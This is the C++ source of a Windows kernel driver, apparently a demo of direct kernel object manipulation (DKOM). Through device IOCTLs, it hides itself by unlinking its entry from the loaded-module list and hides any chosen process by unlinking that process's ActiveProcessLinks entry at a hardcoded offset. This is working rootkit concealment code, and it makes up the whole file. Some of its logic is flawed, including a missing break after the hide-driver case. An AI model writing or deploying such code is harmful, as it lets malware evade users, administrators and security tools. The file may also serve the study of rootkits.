#include <ntifs.h>
#include <ntddk.h>

// local includes
#include "KernelObjectHelpers.h"
#include "DKOM_DemoCommon.h"

// prototypes
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP irp);
NTSTATUS DriverDispatch(PDEVICE_OBJECT DeviceObject, PIRP irp);
NTSTATUS DriverUnlink(_In_ PDRIVER_OBJECT DriverObject, PUNICODE_STRING DriverName);
NTSTATUS FindKernelModule(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING DriverName);

// to make the driver object visible from DriverDispatch
// i know this is stupid, someone inform me of a better way
PDRIVER_OBJECT GlobalDriverObject;

// Driver entry point
extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);
	GlobalDriverObject = DriverObject;

	DriverObject->DriverUnload = DriverUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_READ] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDispatch;

	// Create the Device Object and Device Name
	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\DKOM_Driver");
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(
		DriverObject,
		0,
		&DeviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&DeviceObject);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create device object (0x%08X)\n", status));

		// in case a device object was actually created
		if (DeviceObject)
			IoDeleteDevice(DeviceObject);

		return status;
	}

	// create the symbolic link
	UNICODE_STRING SymbolicLink = RTL_CONSTANT_STRING(L"\\DosDevices\\DKOM_Driver");
	status = IoCreateSymbolicLink(&SymbolicLink, &DeviceName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create symbolic link (0x%08X)\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	// set the flags to reflect state
	DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
	DeviceObject->Flags |= DO_DIRECT_IO;

	return STATUS_SUCCESS;
}

//
// driver hiding logic
//
NTSTATUS DriverUnlink(_In_ PDRIVER_OBJECT DriverObject, PUNICODE_STRING DriverName) {
	// Initialize the three relevent list entries
	PKLDR_DATA_TABLE_ENTRY ThisModuleDataTable = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	PLIST_ENTRY ThisModule = &ThisModuleDataTable->InLoadOrderLinks;
	if (!ThisModule)
		return STATUS_UNSUCCESSFUL;

	PLIST_ENTRY PrevModule = ThisModule->Blink;
	PLIST_ENTRY NextModule = ThisModule->Flink;

	// Replace PrevModule Flink with NextModule's address;
	PrevModule->Flink = NextModule;
	// Replace NextModule Blink with PrevModule's address
	NextModule->Blink = PrevModule;

	// point target process to itself
	ThisModule->Flink = ThisModule;
	ThisModule->Blink = ThisModule;

	NTSTATUS status = FindKernelModule(DriverObject, DriverName);
	if (NT_SUCCESS(status)) {
		return STATUS_UNSUCCESSFUL;
	}

	return STATUS_SUCCESS;
}

NTSTATUS FindKernelModule(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING DriverName) {
	// Logic can be similarly used for finding the PsLoadedModuleList head. ntoskrnl.exe is always the head
	PKLDR_DATA_TABLE_ENTRY pThisModule = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	PLIST_ENTRY KModEntry = { nullptr };
	PLIST_ENTRY FirstEntry = pThisModule->InLoadOrderLinks.Flink;

	// https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo
	// Get PsLoadedModuleList address
	for (PLIST_ENTRY pListEntry = pThisModule->InLoadOrderLinks.Flink;
		(pListEntry != &pThisModule->InLoadOrderLinks) &
		(pThisModule->InLoadOrderLinks.Flink != FirstEntry);
		pListEntry = pListEntry->Flink)
	{
		// Search for Ntoskrnl entry
		PKLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(
			pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (RtlEqualUnicodeString(DriverName, &pEntry->BaseDllName, true)) {
			// Ntoskrnl is always the first entry in the list
			// so the previous entry is the PsLoadedModuleList
			// check if the found pointer belongs to Ntoskrnl module
			KModEntry = pListEntry;
			return STATUS_SUCCESS;
		}
	}

	return STATUS_UNSUCCESSFUL;
}

//
// DriverObject member methods
//
NTSTATUS DriverDispatch(PDEVICE_OBJECT DeviceObject, PIRP irp) {
	// Refs: https://vxug.fakedoma.in/papers/Hide%20process%20with%20DKOM%20without%20hardcoded%20offsets.txt
	UNREFERENCED_PARAMETER(DeviceObject);
	auto stack = IoGetCurrentIrpStackLocation(irp);
	auto status = STATUS_SUCCESS;

	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_DKOM_DEMO_HIDE_DRIVER: {
		// invoke driver hiding logic
		UNICODE_STRING DriverName = RTL_CONSTANT_STRING(L"dkom_demo.sys");
		status = DriverUnlink(GlobalDriverObject, &DriverName);
		if (!NT_SUCCESS(status)) {
			IoDeleteDevice(DeviceObject);
			return status;
		}
	}

	case IOCTL_DKOM_DEMO_HIDE_PROCESS: {
		if (stack->Parameters.DeviceIoControl.InputBufferLength < sizeof(ProcessData)) {
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		// get the data from the IO_STACK
		auto data = (ProcessData*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		// validate the data ptr
		if (data == nullptr) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		__try {
			// turn the PID into a pointer
			PEPROCESS Process;
			status = PsLookupProcessByProcessId((HANDLE)data->pid, &Process);
			if (!NT_SUCCESS(status))
				break;
			
			// get ActiveProcessLinks address
			UINT64 offset = 0x2f0;

			if (!offset) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			// get the ActiveProcesLinks address
			auto CurrentListEntry = (PLIST_ENTRY)((PUCHAR)Process + offset);

			auto PrevListEntry = CurrentListEntry->Blink;
			auto NextListEntry = CurrentListEntry->Flink;

			// unlink the target process
			PrevListEntry->Flink = NextListEntry;
			NextListEntry->Blink = PrevListEntry;

			// point target process to itself
			CurrentListEntry->Flink = CurrentListEntry;
			CurrentListEntry->Blink = CurrentListEntry;

			// dereference target process
			ObDereferenceObject(Process); 

			status = STATUS_SUCCESS;
			irp->IoStatus.Information = sizeof(HANDLE);

		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			status = STATUS_ACCESS_VIOLATION;
		}
		break;
	}
	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	irp->IoStatus.Status = status;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\DKOM_Driver");
	// delete symbolic link
	IoDeleteSymbolicLink(&symLink);

	// delete device object
	IoDeleteDevice(DriverObject->DeviceObject);
}

